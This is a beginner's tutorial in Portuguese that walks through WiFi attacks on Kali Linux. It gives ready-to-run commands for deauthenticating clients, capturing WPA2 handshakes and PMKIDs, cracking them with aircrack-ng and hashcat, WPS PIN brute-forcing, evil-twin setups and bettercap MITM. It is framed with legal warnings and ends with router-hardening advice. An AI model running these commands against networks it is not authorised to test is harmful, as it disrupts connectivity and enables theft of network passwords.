# 📡 WiFi e Kali Linux — Explicado do Zero (pra quem nunca viu nada)

> [!warning] ⚖️ LEIA ISTO PRIMEIRO (sério, é importante)
> Tudo aqui é pra você usar **na SUA rede** ou num **laboratório seu** (ex.: um roteador velho que você comprou só pra brincar/estudar).
>
> Mexer na rede ou no celular/computador **dos outros sem permissão por escrito é CRIME** no Brasil (Lei 12.737/2012 e Marco Civil da Internet). Pode dar cadeia e multa.
>
> A ideia de estudar isso é entender como o ataque funciona **pra saber se DEFENDER**. Pensa como um chaveiro: ele aprende a abrir fechaduras pra fazer fechaduras melhores — não pra roubar casas.

---

## 🍼 Antes de começar: o que é cada coisa?

Vou explicar como se você nunca tivesse ouvido falar. Sem pressa.

### O que é "rede WiFi"?
É a internet sem fio da sua casa. Existe uma "caixinha" (o **roteador**) que solta um sinal invisível pelo ar. Seu celular "pega" esse sinal e se conecta. Pronto, você tem internet.

### O que é Kali Linux?
É um **sistema operacional** (tipo o Windows ou o Android, mas diferente). Ele já vem com **um monte de ferramentas de segurança instaladas**. É o "kit de ferramentas" preferido de quem estuda segurança de redes. Você pode rodar ele:
- Instalado no computador
- Num pendrive (modo "live")
- Dentro de um programa de máquina virtual (VirtualBox / VMware)

### Palavras que vão aparecer o tempo todo (decora essas 6)

| Palavra | O que significa (versão bebê) |
|---------|-------------------------------|
| **Roteador / AP** | A "caixinha" que solta o WiFi. AP = "Access Point" = ponto de acesso. |
| **SSID** | O **nome** da rede que aparece no seu celular. Ex.: `WIFI_DA_VOVO`. |
| **BSSID** | O "RG" do roteador. Um código único tipo `AA:BB:CC:11:22:33`. Chama-se endereço **MAC**. |
| **Cliente** | Qualquer aparelho conectado: celular, notebook, TV, babá eletrônica... |
| **Canal** | Tipo a "estação de rádio" que o WiFi usa. Existem vários canais (1, 6, 11...). |
| **Senha (handshake)** | A senha do WiFi. **Mas atenção:** a senha NÃO viaja pelo ar! Explico isso já já. |

---

## 🔐 Os tipos de senha de WiFi (do pior pro melhor)

Quando você cria uma rede, ela usa um "tipo de cadeado". Uns são fracos, outros fortes.

| Cadeado | É seguro? | Versão bebê |
|---------|-----------|-------------|
| **Aberta** (sem senha) | ❌ NÃO | Porta escancarada. Qualquer um entra. |
| **WEP** | ❌ NÃO | Cadeado de plástico. Quebra em minutos. Bem velho. |
| **WPA** | ⚠️ Mais ou menos | Cadeado antigo. Evite. |
| **WPA2** | ✅ Bom | O mais comum nas casas hoje. Bom **se a senha for difícil**. |
| **WPA3** | ✅✅ Ótimo | O mais novo e mais forte. Use se puder. |

> [!important] 🧠 A sacada mais importante de tudo
> No WPA2 a **senha não trafega pelo ar**. O que o atacante pega é só um "selo matemático" gerado a partir da senha (chamado **handshake**). Depois ele fica em casa **tentando adivinhar** a senha, testando milhões de palavras de uma lista.
>
> **Tradução:** se a sua senha for tipo `123456` ou `casa123`, ele acha rapidinho. Se for tipo `Tj8#kQ2mNp!vXz90`, ele **NUNCA** vai conseguir (levaria mais que uma vida inteira). É por isso que **senha forte resolve quase tudo**.

---

## 🛒 Passo 0 — O que você precisa ter

### 1. Kali Linux rodando
Instale numa máquina virtual (jeito mais fácil e seguro pra estudar) ou num pendurive.

### 2. Uma "antena" WiFi especial (placa/adaptador USB)
A placa de WiFi normal do notebook **geralmente não serve**. Você precisa de um adaptador USB que aceite **"modo monitor"** (explico no próximo passo).

Modelos famosos pra estudo:
- **TP-Link TL-WN722N versão 1** (cuidado: a v2 e v3 NÃO servem!)
- Adaptadores com chip **RTL8812AU** (pegam WiFi de 5GHz também)

> [!tip] 🤔 Por que preciso de outra antena?
> A antena normal do notebook só escuta o que é "pra ela". A antena especial consegue escutar **tudo que passa no ar**, igual um rádio que pega todas as estações. Isso se chama **modo monitor**.

---

## 🛠️ Passo 1 — Deixar a antena "escutando tudo" (modo monitor)

Abra o **Terminal** no Kali (aquela telinha preta onde você digita comandos).

> [!note] Como ler os comandos
> Tudo que está dentro das caixinhas pretas você **digita e aperta Enter**. O `sudo` no começo significa "fazer isso como chefe/administrador" — às vezes pede sua senha.

**1. Ver o nome da sua antena:**
```bash
iwconfig
```
Vai aparecer algo como `wlan0`. Esse é o nome da sua antena. (Pode ser `wlan1`, etc.)

**2. Fechar programas que atrapalham:**
```bash
sudo airmon-ng check kill
```

**3. Ligar o modo monitor:**
```bash
sudo airmon-ng start wlan0
```
Agora sua antena pode estar com nome novo: `wlan0mon`. Guarde esse nome.

**4. Conferir se deu certo:**
```bash
iwconfig
```
Procure por `Mode:Monitor`. Se apareceu, 🎉 deu certo!

**5. Quando terminar, voltar ao normal:**
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

---

## 🔭 Passo 2 — Olhar quais redes existem ao redor (scan)

Agora vamos "ligar o rádio" e ver todas as redes WiFi por perto.

```bash
sudo airodump-ng wlan0mon
```

Vai aparecer uma lista que se atualiza sozinha. Parece assustador, mas é simples:

**Parte de CIMA = as redes (roteadores):**

| Coluna | O que é (versão bebê) |
|--------|----------------------|
| **BSSID** | O "RG" do roteador |
| **PWR** | Força do sinal. Quanto mais perto de 0, mais forte (ex.: -30 é ótimo, -85 é fraco/longe) |
| **CH** | O canal (a "estação de rádio") |
| **ENC** | O tipo de cadeado (WPA2, etc.) |
| **ESSID** | O **nome** da rede |

**Parte de BAIXO = os aparelhos conectados (clientes):**

| Coluna | O que é |
|--------|---------|
| **STATION** | O "RG" do celular/notebook conectado |
| **BSSID** | Em qual roteador ele está conectado |

**Quando achar a SUA rede**, anote duas coisas: o **BSSID** e o **CH** (canal). Aperte `Ctrl + C` para parar.

Agora foque só na sua rede e **grave** o que passar:
```bash
sudo airodump-ng --bssid AA:BB:CC:11:22:33 --channel 6 --write captura wlan0mon
```
- Troque `AA:BB:CC:11:22:33` pelo BSSID da sua rede.
- Troque `6` pelo canal (CH) da sua rede.
- `captura` é o nome dos arquivos que vão ser salvos.

Deixe essa janela **aberta**.

---

## 🤝 Passo 3 — Pegar o "selo da senha" (handshake)

Lembra que a senha não viaja pelo ar? Mas tem um momentinho em que o "selo" dela (handshake) aparece: **quando um aparelho se conecta** na rede.

Você tem 2 opções:

**Opção A — Esperar:** deixar a janela aberta até alguém conectar sozinho (ligar o celular no WiFi, por exemplo).

**Opção B — Forçar (mais rápido):** dar um "empurrãozinho" pra um aparelho cair e reconectar. Abra **outra** janela do terminal e digite:
```bash
sudo aireplay-ng -0 5 -a AA:BB:CC:11:22:33 -c 99:88:77:66:55:44 wlan0mon
```
- `-0 5` = mandar 5 "tchauzinhos" (chamado **deauth**, de "desautenticar").
- `-a` = o BSSID do roteador.
- `-c` = o STATION (RG) do aparelho que você quer derrubar (pega lá embaixo no airodump).

> [!warning] ⚠️ Cuidado com o "deauth"
> Isso **derruba a internet** de quem está conectado por uns segundos. Por isso: só na SUA rede! Mande **poucos** (3 a 5), não centenas. O objetivo é só fazer o aparelho reconectar e soltar o handshake.

**Como sei que peguei o handshake?**
Olhe a janela do airodump-ng (do Passo 2). Quando pegar, aparece lá em cima:
```
[ WPA handshake: AA:BB:CC:11:22:33 ]
```
🎉 Conseguiu! Pode parar tudo com `Ctrl + C`.

---

## 🔓 Passo 4 — Tentar descobrir a senha (offline)

Agora você nem precisa mais estar perto da rede. É só "adivinhação": testar uma lista gigante de senhas contra o handshake até bater.

### Jeito simples (aircrack-ng)
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:11:22:33 captura-01.cap
```
- `rockyou.txt` é uma lista famosa com milhões de senhas comuns (já vem no Kali).
- Se achar, aparece: `KEY FOUND! [ a_senha_aqui ]` 🎉

> [!note] Se der erro dizendo que rockyou está zipado:
> ```bash
> sudo gunzip /usr/share/wordlists/rockyou.txt.gz
> ```

### Jeito turbo (hashcat — usa a placa de vídeo, bem mais rápido)
```bash
# 1. Converter o arquivo
hcxpcapngtool -o hash.hc22000 captura-01.cap

# 2. Quebrar usando a lista
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# 3. Ver o resultado
hashcat -m 22000 hash.hc22000 --show
```

> [!important] 🧠 O que isso te ensina
> Se a senha estava na lista (`rockyou`), é porque era uma senha **comum/fraca**. Se você usar uma senha longa e aleatória, ela **não está em lista nenhuma** e não tem como adivinhar. Lição aprendida! Veja a parte de **Defesa** no final.

---

## 🎛️ Passo 5 — Outras técnicas (resumo de bebê)

Você não precisa decorar tudo agora. É só pra saber que existem.

### WPS (o botãozinho de conectar fácil)
Aquele botão no roteador que conecta sem digitar senha. Tem um número (PIN) de 8 dígitos. Roteadores antigos têm uma falha que deixa adivinhar esse PIN.
```bash
sudo wash -i wlan0mon                              # ver quem tem WPS ligado
sudo reaver -i wlan0mon -b AA:BB:CC:11:22:33 -c 6 -vv
```
**Defesa:** desligue o WPS no seu roteador. 👍

### "Gêmeo do mal" (Evil Twin)
O atacante cria uma rede **falsa com o mesmo nome** da verdadeira. Você conecta achando que é a sua, e ele te mostra uma página pedindo "digite a senha do WiFi". Aí você entrega a senha sem querer.
```bash
sudo airgeddon    # menu que faz isso de forma automática
```
**Defesa:** desconfie de páginas pedindo a senha do WiFi do nada; use redes WPA3.

### PMKID (sem precisar de ninguém conectado)
Um truque que pega o "selo" direto do roteador, sem esperar aparelho conectar.
```bash
sudo hcxdumptool -i wlan0mon -o captura.pcapng
hcxpcapngtool -o pmkid.hc22000 captura.pcapng
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt
```

### Ferramenta que faz quase tudo sozinha (pra iniciante)
```bash
sudo wifite
```
O **wifite** é um "robô" que escaneia, captura handshake, tenta WPS e PMKID — tudo num menu. Ótimo pra quem está começando.

---

## 🔬 Bônus — Olhar o tráfego (Wireshark) e MITM

Você pediu esses temas, então aqui vai a versão simples:

### Wireshark — "ver os pacotes passando"
É um programa com tela gráfica que mostra **cada pedacinho** de dado que passa na rede. Tipo um raio-X do trânsito de carros numa estrada.
```bash
sudo wireshark
```
Útil pra **aprender** como a internet conversa. Na maioria dos sites hoje (HTTPS, com cadeado 🔒) o conteúdo está **criptografado**, então você vê que algo passou, mas não consegue ler — e isso é bom, é a segurança funcionando.

### MITM (homem-no-meio) — só o conceito
"Man In The Middle" = o atacante se coloca **no meio** da conversa entre você e a internet, tipo um carteiro que abre suas cartas antes de entregar. Ferramentas como **bettercap** fazem isso em laboratório.
```bash
sudo bettercap -iface wlan0
```
**Defesa:** sites com `https://` e cadeado, e usar **VPN** em WiFi público, atrapalham muito esse ataque.

---

## 🛡️ A PARTE MAIS IMPORTANTE — Como se proteger

Se você só ler uma parte deste arquivo, leia esta. Faça isso no seu roteador:

- ✅ **Senha bem grande e difícil** (16+ caracteres, com letras, números e símbolos, sem palavra do dicionário). → Isso sozinho já bloqueia quase todos os ataques de senha.
- ✅ **Use WPA3** (ou pelo menos **WPA2-AES**). Nunca WEP nem WPA antigo.
- ✅ **Desligue o WPS.**
- ✅ **Ligue o "PMF / 802.11w"** se o roteador tiver (protege contra o "deauth").
- ✅ **Troque a senha de administrador** do roteador (a de entrar nas configurações, não a do WiFi).
- ✅ **Atualize o firmware** do roteador de vez em quando.
- ✅ **Desligue o "acesso remoto"** se não usar.
- ✅ **Crie uma rede de visitantes** separada pras visitas e aparelhos de casa inteligente (TV, câmera, etc.).

> [!tip] 🎯 Resumindo numa frase
> **WPA3 + senha longa e aleatória + WPS desligado + roteador atualizado** = você bloqueia quase todos os ataques deste guia. Simples assim.

---

## 🧾 Cola rápida (todos os comandos juntos)

```bash
# --- LIGAR MODO MONITOR ---
iwconfig                               # ver nome da antena (ex: wlan0)
sudo airmon-ng check kill              # fechar o que atrapalha
sudo airmon-ng start wlan0             # ligar modo monitor (vira wlan0mon)

# --- ESCANEAR ---
sudo airodump-ng wlan0mon                                          # ver tudo
sudo airodump-ng --bssid <BSSID> -c <CANAL> -w captura wlan0mon    # focar e gravar

# --- PEGAR HANDSHAKE ---
sudo aireplay-ng -0 5 -a <BSSID> -c <CLIENTE> wlan0mon             # empurrãozinho

# --- DESCOBRIR SENHA ---
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> captura-01.cap

# --- VERSÃO TURBO (hashcat) ---
hcxpcapngtool -o hash.hc22000 captura-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 hash.hc22000 --show

# --- DESLIGAR MODO MONITOR (quando terminar) ---
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager

# --- ROBÔ QUE FAZ TUDO ---
sudo wifite
```

---

*Material de estudo pessoal. Use só na sua própria rede ou laboratório autorizado. Estudar ataque serve pra você defender melhor. 🛡️*
